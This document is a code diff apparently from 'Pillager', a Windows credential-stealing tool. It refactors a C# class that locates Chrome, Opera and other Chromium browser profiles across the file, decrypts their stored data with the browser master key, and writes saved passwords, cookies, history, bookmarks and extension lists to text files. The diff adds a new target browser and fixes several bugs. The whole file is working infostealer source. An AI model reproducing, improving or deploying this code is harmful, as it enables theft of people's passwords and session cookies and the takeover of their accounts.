@@ -2,23 +2,24 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Management;
 using System.Security.Cryptography;
 using System.Text;
 using Pillager.Helper;
 
 namespace Pillager.Browsers
 {
-    public static class Chrome
+    public class Chrome : ICommand
     {
-        public static string BrowserPath { get; set; }
+        public string BrowserPath { get; set; }
 
-        public static string BrowserName { get; set; }
+        public string BrowserName { get; set; }
 
-        public static byte[] MasterKey { get; set; }
+        public byte[] MasterKey { get; set; }
 
-        private static string[] profiles { get; set; }
+        private string[] profiles { get; set; }
 
-        public static Dictionary<string, string> browserOnChromium = new Dictionary<string, string>
+        public Dictionary<string, string> browserOnChromium = new Dictionary<string, string>
         {
             { "Chrome", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Google\\Chrome\\User Data" )} ,
             { "Chrome Beta",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome Beta\\User Data" )},
@@ -44,10 +45,10 @@ namespace Pillager.Browsers
             { "Iridium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Iridium\\User Data" )},
             { "Opera", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera Stable" )},
             { "Opera GX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera GX Stable" )},
+            { "The World", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"theworld6\\User Data" )},
         };
 
-
-        public static byte[] GetMasterKey()
+        public byte[] GetMasterKey()
         {
             string filePath = Path.Combine(BrowserPath, "Local State");
             byte[] masterKey = new byte[] { };
@@ -71,13 +72,13 @@ namespace Pillager.Browsers
             }
         }
 
-        private static byte[] DecryptData(byte[] buffer)
+        private byte[] DecryptData(byte[] buffer)
         {
             byte[] decryptedData = null;
             if (MasterKey is null) return null;
             try
             {
-                string bufferString = Encoding.Default.GetString(buffer);
+                string bufferString = Encoding.UTF8.GetString(buffer);
                 if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                 {
                     byte[] iv = new byte[12];
@@ -99,7 +100,7 @@ namespace Pillager.Browsers
             return decryptedData;
         }
 
-        public static string Chrome_passwords()
+        public string Chrome_passwords()
         {
             StringBuilder passwords = new StringBuilder();
             foreach (var profile in profiles)
@@ -133,7 +134,7 @@ namespace Pillager.Browsers
             return passwords.ToString();
         }
 
-        public static string Chrome_history()
+        public string Chrome_history()
         {
             StringBuilder history = new StringBuilder();
             foreach (var profile in profiles)
@@ -160,19 +161,19 @@ namespace Pillager.Browsers
             return history.ToString();
         }
 
-        public static string Chrome_cookies()
+        public string Chrome_cookies()
         {
             StringBuilder cookies = new StringBuilder();
             foreach (var profile in profiles)
             {
-                string chrome_cookie_path = Path.Combine(BrowserPath, profile + "\\Cookies");
-                string chrome_100plus_cookie_path = Path.Combine(BrowserPath, profile + "\\Network\\Cookies");
-                if (!File.Exists(chrome_cookie_path))
-                    chrome_cookie_path = chrome_100plus_cookie_path;
-                if (!File.Exists(chrome_cookie_path))
-                    continue;
                 try
                 {
+                    string chrome_cookie_path = Path.Combine(BrowserPath, profile + "\\Cookies");
+                    string chrome_100plus_cookie_path = Path.Combine(BrowserPath, profile + "\\Network\\Cookies");
+                    if (File.Exists(chrome_100plus_cookie_path))
+                        chrome_cookie_path = chrome_100plus_cookie_path;
+                    if (!File.Exists(chrome_cookie_path))
+                        continue;
                     string cookie_tempFile = Path.GetTempFileName();
                     try
                     {
@@ -196,6 +197,7 @@ namespace Pillager.Browsers
                             string host_key = handler.GetValue(i, "host_key");
                             string name = handler.GetValue(i, "name");
                             string crypt = handler.GetValue(i, "encrypted_value");
+                            if (string.IsNullOrEmpty(crypt)) continue;
                             string path = handler.GetValue(i, "path");
                             double expDateDouble = 0;
                             long.TryParse(handler.GetValue(i, "expires_utc"), out var expDate);
@@ -219,7 +221,7 @@ namespace Pillager.Browsers
                 }
                 catch { }
             }
-            if (cookies.Length > 0)
+            if (cookies.Length > 3)
             {
                 string temp = cookies.ToString();
                 return "[" + temp.Substring(0, temp.Length - 3) + "]";
@@ -227,7 +229,7 @@ namespace Pillager.Browsers
             return cookies.ToString();
         }
 
-        public static string Chrome_books()
+        public string Chrome_books()
         {
             StringBuilder stringBuilder = new StringBuilder();
             foreach (var profile in profiles)
@@ -241,7 +243,7 @@ namespace Pillager.Browsers
             return stringBuilder.ToString();
         }
 
-        public static string Chrome_extensions()
+        public string Chrome_extensions()
         {
             StringBuilder stringBuilder = new StringBuilder();
             foreach (var profile in profiles)
@@ -273,7 +275,7 @@ namespace Pillager.Browsers
             return stringBuilder.ToString();
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             foreach (var browser in browserOnChromium)
             {
@@ -300,15 +302,15 @@ namespace Pillager.Browsers
                     string savepath = Path.Combine(path, BrowserName);
                     Directory.CreateDirectory(savepath);
                     string cookies = Chrome_cookies();
+                    if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies,Encoding.UTF8);
                     string passwords = Chrome_passwords();
+                    if (!string.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords, Encoding.UTF8);
                     string books = Chrome_books();
+                    if (!string.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books, Encoding.UTF8);
                     string history = Chrome_history();
+                    if (!string.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history, Encoding.UTF8);
                     string extension = Chrome_extensions();
-                    if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
-                    if (!string.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
-                    if (!string.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
-                    if (!string.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
-                    if (!string.IsNullOrEmpty(extension)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_extension.txt"), extension);
+                    if (!string.IsNullOrEmpty(extension)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_extension.txt"), extension, Encoding.UTF8);
                     foreach (var profile in profiles)
                     {
                         Directory.CreateDirectory(Path.Combine(BrowserPath, profile));
